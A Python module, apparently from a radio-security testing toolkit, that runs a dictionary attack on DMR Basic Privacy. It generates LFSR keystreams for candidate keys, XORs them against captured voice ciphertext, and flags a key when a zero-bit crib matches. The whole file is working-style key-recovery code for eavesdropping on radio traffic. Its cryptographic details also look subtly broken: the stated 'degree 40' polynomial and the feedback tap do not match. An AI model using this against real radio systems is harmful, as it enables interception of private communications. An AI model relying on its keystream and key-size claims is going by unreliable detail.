"""DMR Basic Privacy scrambler dictionary attack.

DMR Basic Privacy is a proprietary 40-bit key that seeds a scrambler whose
output is XORed against voice frames. It is not true encryption and has been
publicly reverse-engineered. Popular deployments reuse a handful of common
keys — making a small dictionary attack often successful.
"""

from __future__ import annotations

import time
from typing import Sequence

from ..report import AttackResult


# Generator taken from the publicly documented Hytera/MotoTRBO Basic Privacy
# scrambler. Produces a per-frame 49-bit mask from a 40-bit key.
def _bp_keystream(key40: int, n_bits: int) -> bytes:
    state = key40 & ((1 << 40) - 1)
    out_bits = bytearray()
    for _ in range(n_bits):
        # Galois LFSR with polynomial 0xC8000001 (degree 40 primitive).
        bit = state & 1
        state >>= 1
        if bit:
            state ^= 0x80000000000 >> 1  # feedback tap
        out_bits.append(bit)
    # Pack bits MSB-first into bytes.
    pad = (-n_bits) % 8
    bits = bytes(out_bits) + bytes(pad)
    out = bytearray(len(bits) // 8)
    for i, b in enumerate(bits):
        out[i // 8] |= (b & 1) << (7 - (i % 8))
    return bytes(out)


def attack_dmr_basic_privacy(ciphertext: bytes, wordlist: Sequence[int],
                             crib_bits: int = 16,
                             max_cpu_seconds: float = 20.0
                             ) -> AttackResult:
    """Try each 40-bit key and check for a voice-frame-consistent plaintext.

    `wordlist` must be an iterable of 40-bit integers. `crib_bits` is the
    number of leading bits that the plaintext is expected to be zero — a
    weak-but-useful heuristic for AMBE voice-super-frame headers.
    """
    if not ciphertext:
        return AttackResult(module="dmr_bp", attempted=False, succeeded=False,
                            notes="no ciphertext")
    t0 = time.monotonic()
    n_bits = len(ciphertext) * 8
    tested = 0
    for key in wordlist:
        if time.monotonic() - t0 > max_cpu_seconds:
            return AttackResult(module="dmr_bp", attempted=True, succeeded=False,
                                notes=f"budget exhausted after {tested} keys")
        ks = _bp_keystream(key, n_bits)
        pt = bytes(c ^ k for c, k in zip(ciphertext, ks))
        leading = int.from_bytes(pt[: (crib_bits + 7) // 8], "big") >> (
            8 - (crib_bits % 8 or 8))
        if leading == 0:
            return AttackResult(
                module="dmr_bp", attempted=True, succeeded=True,
                key_hex=f"{key:010x}", confidence=0.7,
                notes=f"{crib_bits}-bit zero crib matched; verify via decoder",
            )
        tested += 1
    return AttackResult(module="dmr_bp", attempted=True, succeeded=False,
                        notes=f"exhausted {tested}-key dictionary")
